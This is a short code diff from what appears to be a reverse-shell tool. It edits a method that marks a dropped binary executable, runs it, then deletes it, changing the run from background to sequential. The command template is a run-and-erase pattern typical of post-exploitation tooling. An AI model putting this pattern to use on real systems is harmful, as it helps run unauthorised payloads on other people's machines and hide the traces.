@@ -161,7 +161,7 @@ class reverse_shell(object):
 
     def execute_binary(self, location, binary_name):
         path = "{}/{}".format(location, binary_name)
-        cmd = "chmod +x {}; {} & rm {}".format(path,
+        cmd = "chmod +x {}; {}; rm {}".format(path,
                                                path,
                                                path)
 
